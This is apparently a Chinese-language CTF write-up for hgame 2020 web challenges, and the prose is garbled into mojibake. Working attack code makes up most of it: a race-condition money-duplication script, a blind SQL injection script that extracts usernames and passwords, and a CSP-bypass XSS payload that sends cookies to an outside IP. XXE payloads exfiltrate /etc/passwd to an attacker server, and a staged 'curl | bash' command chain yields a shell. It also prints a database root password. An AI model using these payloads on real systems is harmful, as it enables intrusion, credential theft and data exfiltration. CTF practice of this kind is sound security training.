æ‰§è¡Œå®Œæ­¥éª¤1(<code>$num=1</code>);båˆšè¦å¼€å§‹æ‰§è¡Œæ­¥éª¤1</li><li>aæ‰§è¡Œå®Œæ­¥éª¤äºŒ;bæ‰§è¡Œå®Œæ­¥éª¤ä¸€(<code>$num=1</code>)</li><li>aæ‰§è¡Œæ­¥éª¤ä¸‰,ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±å¢åŠ äº†;bæ‰§è¡Œå®Œæ­¥éª¤äºŒ,bè¿›ç¨‹ä¹Ÿæ»¡è¶³æ¡ä»¶</li><li>aæ‰§è¡Œæ­¥éª¤å››,æ­¤æ—¶æ•°æ®åº“ä¸­å•†å“çš„æ•°é‡ä¸º0,bæ‰§è¡Œå®Œæ­¥éª¤ä¸‰,ç”¨æˆ·è´¦æˆ·é‡Œçš„é’±å¢åŠ äº†</li><li>aè¿›ç¨‹ç»“æŸ;bè¿›ç¨‹è¯•å›¾å‡å°‘æ•°æ®åº“ä¸­å•†å“çš„æ•°é‡,ä½†æ˜¯æ•°é‡æœ€å°ä¸º0,æ“ä½œå¤±è´¥</li><li>bè¿›ç¨‹ç»“æŸ</li></ol><p>äºæ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€ç»ˆç»“æœæ˜¯,ç”¨æˆ·ç”¨1å•ä½çš„å•†å“å–å‡ºäº†ä¸¤ä¸ªå•ä½å•†å“çš„ä»·é’±(1ä¸ªå•†å“è¢«å–äº†ä¸¤æ¬¡)</p><p>ä¸ºå•¥ä¼šè¿™æ ·,è¿™æ˜¯åŒæ—¶æ“ä½œä¸€ä¸ªæ•°æ®å¯¼è‡´çš„bug,è¿™ä¹Ÿæ˜¯ä¸ºå•¥è®¡ç®—æœºé‡Œç»å¸¸å‡ºç°é”è¿™ä¸ªåç§°çš„åŸå› ,ç»™æ•°æ®ä¸Šé”,é¿å…ä¸¤ä¸ªè¿›ç¨‹åŒæ—¶æ“ä½œä¸€ä¸ªæ•°æ®,å¯¼è‡´bug</p><p>åˆ·é’±è„šæœ¬</p><pre><code class="python">from multiprocessing import Poolimport requestsdef buy(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully buy %d items&quot; % num)def solve(num,loop=3):    for i in range(loop):        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text        if &quot;success&quot; in result:            print(&quot;successfully solve %d items&quot; % num)if __name__==&#39;__main__&#39;:    i=0    while True:        p = Pool(100)        num=500        for i in range(100):            p.apply_async(buy, args=(num,))        print(&#39;Waiting for all buy subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)        p = Pool(100)        for i in range(100):            p.apply_async(solve, args=(num,))        print(&#39;Waiting for all solve subprocesses done...&#39;)        p.close()        p.join()        print(&#39;All subprocesses done.&#39;)</code></pre><h3 id="ç•™è¨€æ¿"><a href="#ç•™è¨€æ¿" class="headerlink" title="ç•™è¨€æ¿"></a>ç•™è¨€æ¿</h3><p>æ³¨å†Œç™»é™†çš„é»‘åå•</p><pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre><p>ä¸€ä¸ªä¸ªæ£€æµ‹è¾“å…¥ç‚¹å‘ç°,deleteæ–¹æ³•å­˜åœ¨sqlæ³¨å…¥</p><p>æ³¨å…¥è„šæœ¬</p><pre><code class="python">import requestsfrom bs4 import BeautifulSoupdef send():    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)    if res.status_code==200:        return 1    else :        return 0def get_id():    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    html = res.text    try :        soup = BeautifulSoup(html,&#39;html.parser&#39;) #æŠŠç½‘é¡µè§£æä¸ºBeautifulSoupå¯¹è±¡        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]    except:        return False    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)def check(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)    if url in res.text:        return True    return False#index.php?method=delete&amp;delete_id=6594def delete(mesid):    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)def sql_inj(sql):    mesid=get_id()    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)    if not check(mesid):        print(&quot;%s success&quot; % sql)        send()        return True    print(&quot;%s fail&quot; % sql)    return False# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)cha=&quot;0123456789ABCDEF&quot;result=&quot;&quot;p=0while True:    p+=1    temp=&#39;&#39;    for i in cha:        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):            result+=i            temp=i            print(result)            break    if temp!=result[-1]:        break#information_schema,babysql#messages,user#id,name,password</code></pre><h3 id="Cosmosçš„èŠå¤©å®¤2-0"><a href="#Cosmosçš„èŠå¤©å®¤2-0" class="headerlink" title="Cosmosçš„èŠå¤©å®¤2.0"></a>Cosmosçš„èŠå¤©å®¤2.0</h3><p>æ“æ“æ“,è¿™é¢˜å¯¹æˆ‘æœ‰æ¯’,æˆ‘è¿™é‡Œä¸æ˜¾ç¤ºcsp,å¯¼è‡´æˆ‘å¡äº†å¾ˆä¹…</p><p>å­˜åœ¨csp:</p><pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>å…ˆæ£€æµ‹ä¸€ä¸‹</p><p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p><p>è¯´object-srcä¸å®‰å…¨</p><p>è¿™ä¸ªç­–ç•¥å·²ç»banæ‰äº†å†…è”è„šæœ¬,æ‰€ä»¥æˆ‘ä»¬ç›´æ¥ä¼ ä¸€ä¸ªjsä»£ç è¿‡å»æ²¡ç”¨</p><p>æˆ‘ä»¬å¯¹sendæ–¹æ³•è¿›è¡Œæ£€æµ‹å‘ç°,ä¼šè¿‡æ»¤script,ä½†æ˜¯ç”¨åŒå†™å°±å¯ä»¥ç»•è¿‡,è¿˜ä¼šæŠŠå¤§å†™è½¬æˆå°å†™</p><p>ç”¨burpä»£ç†,æŸ¥çœ‹å‘é€çš„è¯·æ±‚,æˆ‘ä»¬å¯ä»¥ä¼šæ³¨æ„åˆ°<code>/send</code>ä¼šç›´æ¥è¿”å›æˆ‘ä»¬å‘é€çš„å†…å®¹,åˆ©ç”¨è¿™ä¸ªæ°å¥½å¯ä»¥ç»•è¿‡<code>script-src &#39;self&#39;</code> ,</p><p>æˆ‘ä»¬å‘é€ä»¥ä¸‹payload(ç”¨scriptæ ‡ç­¾ä¹Ÿä¸€æ ·)</p><pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>æˆåŠŸå¼¹çª—,ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰<code>default-src &#39;self&#39;</code>é˜»ç¢ç€æˆ‘ä»¬å¸¦å›æ•°æ®</p><p>å› ä¸ºæ²¡æœ‰è®¾ç½®<code>object-src</code>æˆ‘ä»¬å¯ä»¥ç”¨<code>embed</code>æ ‡ç­¾å¸¦å›æ•°æ®</p><p>æœ€åçš„payload</p><pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3biframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3beval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p><h3 id="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"><a href="#ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ" class="headerlink" title="ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ"></a>ä»£æ‰“å‡ºé¢˜äººæœåŠ¡ä¸­å¿ƒ</h3><p>ä¸€çœ‹å°±çŸ¥é“æœ‰xxeæ¼æ´</p><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE r [&lt;!ELEMENT r ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;r&gt;&amp;exfil;&lt;/r&gt;File stored on http://39.108.164.219/evil.xml&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p><pre><code class="php">&lt;?phpinclude &quot;config.php&quot;;$result = null;libxml_disable_entity_loader(false);$xmlfile = file_get_contents(&#39;php://input&#39;);try{    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);    $stmt-&gt;bindParam(&#39;:id&#39;, $id);    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);    $dom = new DOMDocument();    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);    $creds = simplexml_import_dom($dom);    $id = $creds-&gt;id;    $chal_name = $creds-&gt;name;    $level = $creds-&gt;level;    $time = $creds-&gt;time;    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;è¯·å¡«å†™ä¿¡æ¯ï¼&quot;);        die($result);    }    $stmt-&gt;execute();    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;å·²æäº¤æˆåŠŸï¼Œæ­£åœ¨ä¸ºæ‚¨å®‰æ’æ‰“æ‰‹&quot;);}catch(Exception $e){    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;æäº¤å¤±è´¥ï¼&quot;);}header(&#39;Content-Type: text/html; charset=utf-8&#39;);echo $result;?&gt;</code></pre><p>config.php</p><pre><code class="php">&lt;?php$dbms=&#39;mysql&#39;;$host=&#39;localhost&#39;;$dbName=&#39;bdctr_message&#39;;$user=&#39;root&#39;;$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);?&gt;</code></pre><p>åŸæœ¬æƒ³ç€ç”¨gopheræ‰§è¡Œsqlè¯­å¥,ä½†æ˜¯æœ‰å¯†ç æ— æ³•æ‰§è¡Œ</p><p>æˆ‘æˆ‘æˆ‘æˆ‘æ˜¯ä¸ªdsb,æ˜æ˜çŸ¥é“å¯èƒ½æ˜¯å†…ç½‘æœ‰å¯èƒ½ç”±å…¶ä»–ä¸»æœº,ä½†å°±æ˜¯ä¸è¯•ä¸€ä¸‹</p><pre><code>IP address       HW type     Flags       HW address            Mask     Device172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0</code></pre><pre><code>127.0.0.1    localhost::1    localhost ip6-localhost ip6-loopbackfe00::0    ip6-localnetff00::0    ip6-mcastprefixff02::1    ip6-allnodesff02::2    ip6-allrouters172.21.0.76    hgame-private172.21.0.31    f9f1b9b99e13</code></pre><p>å‘ç°ä¸€ä¸ªå†…ç½‘æœåŠ¡å™¨<code>172.21.0.76</code></p><p>å½“å°è¯•è®¿é—®80ç«¯å£æ—¶,å‘ç°æ–‡ä»¶å¤ªå¤§ç­‰ä¸€ç³»åˆ—é—®é¢˜</p><blockquote><p>ä½¿ç”¨libxmlè¯»å–æ–‡ä»¶æ—¶,æ–‡ä»¶ä¸èƒ½å¤ªå¤§å¦åˆ™ä¼šæŠ¥é”™</p></blockquote><p>äºæ˜¯å°è¯•å‹ç¼©èƒ½ä¸èƒ½è¯»å–</p><pre><code>&lt;?php    error_reporting(0);    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);?&gt;</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?phperror_reporting(0);$token = @$_GET[&#39;token&#39;];if (!isset($token)) {    die(&quot;è¯·å¸¦ä¸Šæ‚¨çš„é˜Ÿä¼tokenè®¿é—®! /?token=&quot;);}$api = &quot;http://checker/?token=&quot;.$token;$t = file_get_contents($api);if($t !== &quot;ok&quot;) {    die(&quot;é˜Ÿä¼tokené”™è¯¯&quot;);}highlight_file(__FILE__);$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;@mkdir($sandbox);@chdir($sandbox);$content = $_GET[&#39;v&#39;];if (isset($content)) {    $cmd = substr($content,0,5);    system($cmd);}else if (isset($_GET[&#39;r&#39;])) {    system(&#39;rm -rf ./*&#39;);}/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | | | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_| |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)                                    |/*/</code></pre><p>ç„¶ååˆ©ç”¨ <a href="https://err0rzz.github.io/2017/11/13/ctfå‘½ä»¤æ‰§è¡Œä¸ç»•è¿‡/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p><p>çš„æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤</p><pre><code class="php">&lt;?php    $a=file_get_contents(&quot;tmp.xml&quot;);    $command=array(    &#39;&gt;ls\\\\&#39;,     &#39;ls&gt;_&#39;,     &#39;&gt;\\ \\\\&#39;,     &#39;&gt;-t\\\\&#39;,     &#39;&gt;\\&gt;g&#39;,     &#39;ls&gt;&gt;_&#39;,    &quot;&gt;bash&quot;,    &quot;&gt;\\|\\\\&quot;,    &quot;&gt;5\\\\&quot;,    &quot;&gt;00\\\\&quot;,    &quot;&gt;60\\\\&quot;,    &quot;&gt;9:\\\\&quot;,    &quot;&gt;21\\\\&quot;,    &quot;&gt;4.\\\\&quot;,    &quot;&gt;16\\\\&quot;,    &quot;&gt;8.\\\\&quot;,    &quot;&gt;10\\\\&quot;,    &quot;&gt;9.\\\\&quot;,    &quot;&gt;3\\\\&quot;,    &quot;&gt;\\ \\\\&quot;,    &quot;&gt;rl\\\\&quot;,    &quot;&gt;cu\\\\&quot;    );    foreach($command as $v)    {        echo $v.&quot;\n&quot;;        $v=urlencode($v);        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));        $postdata=&lt;&lt;&lt;MRK&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE msg [&lt;!ELEMENT msg ANY &gt;&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;%sp;%param1;]&gt;&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;MRK;        $opts = array(&#39;http&#39; =&gt;         array( &#39;method&#39;  =&gt; &#39;POST&#39;,        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,        &#39;content&#39; =&gt; $postdata )     );        $context = stream_context_create($opts);        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);    }?&gt;</code></pre><p>åœ¨ç»å†ä¸€æ¬¡rm -rf ä¹‹å,ç»ˆäºæ‹¿åˆ°getshell</p><p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p><p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p><h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>åˆšæ‹¿åˆ°é¢˜ç›®çš„æ—¶å€™,æˆ‘å¿ƒæ€è¢«ç¬¬ä¸€é¢˜æå´©äº†,éšä¾¿çœ‹äº†ä¸€ä¸‹,å°±æºœå»æ‰“æ¸¸æˆäº†,çœ‹äº†wp,è‰¹</p><p>æ‹¿åˆ°é¢˜ç›®,æ˜¯æˆ‘ä¸ç†Ÿæ‚‰çš„nodejs</p><p>å½±å“ä¸å¤§,çœ‹ä¸ªå¤§æ¦‚å°±ä¼šäº†</p><p><code>\route\index.js</code></p><pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {  if (!req.session.sekiro) {    res.end(&quot;Session required.&quot;)  }  if (!req.session.sekiro.alive) {    res.end(&quot;You dead.&quot;)  }  var body = JSON.parse(JSON.stringify(req.body));//åŸå‹é“¾æ±¡æŸ“èµ·ç‚¹  var copybody = clone(body)  if (copybody.solution) {    req.session.sekiro = Game.dealWithAttacks(req.session.sekiro, copybody.solution)  }  res.end(&quot;æäº¤æˆåŠŸ&quot;+JSON.stringify(req.body))})</code></pre><p>åœ¨æ³¨é‡Šå¤„æœ‰ä¸€ä¸ªå¥‡æ€ªçš„æ“ä½œ,è½¬æˆjsonå†è½¬æˆè§£ææˆobj</p><p>è¿™æ‘†æ˜äº†æœ‰é—®é¢˜,é‡åˆ°<code>JSON.parse+merge</code> ,æ€è·¯å¯ä»¥å¾€åŸå‹é“¾æ±¡æŸ“ä¸Šèµ°ä¸€èµ°</p><p>æˆ‘ä»¬ç»§ç»­é˜…è¯»ä»£ç </p><p>è·Ÿè¿›dealWithAttacks</p><pre><code class="javascript">this.dealWithAttacks = function (sekiro, solution) {        if (sekiro.attackInfo.solution !== solution) {            sekiro.health -= sekiro.attackInfo.attack            if (sekiro.attackInfo.additionalEffect) {                var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)//look this            }        }        sekiro.posture = (sekiro.posture &lt;= 500) ? sekiro.posture : 500        sekiro.health = (sekiro.health &gt; 0) ? sekiro.health : 0        if (sekiro.posture == 500 || sekiro.health == 0) {            sekiro.alive = false        }        return sekiro    }</code></pre><pre><code class="javascript">var fn = Function(&quot;sekiro&quot;, sekiro.attackInfo.additionalEffect + &quot;\nreturn sekiro&quot;)                sekiro = fn(sekiro)</code></pre><p>æ˜æ˜¾çš„ä»£ç æ‰§è¡Œ,å¦‚æœæˆ‘ä»¬èƒ½æ§åˆ¶<code>sekiro.attackInfo.additionalEffect</code>,é‚£ä¹ˆä¾¿å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹<code>sekiro.attackInfo.additionalEffect</code>æ˜¯å¦‚ä½•è·å¾—çš„</p><pre><code class="javascript">this.attacks = [        {            &quot;method&quot;: &quot;è¿ç»­ç å‡»&quot;,            &quot;attack&quot;: 1000,            &quot;additionalEffect&quot;: &quot;sekiro.posture+=100&quot;,            &quot;solution&quot;: &quot;è¿ç»­æ ¼æŒ¡&quot;        },        {            &quot;method&quot;: &quot;æ™®é€šæ”»å‡»&quot;,            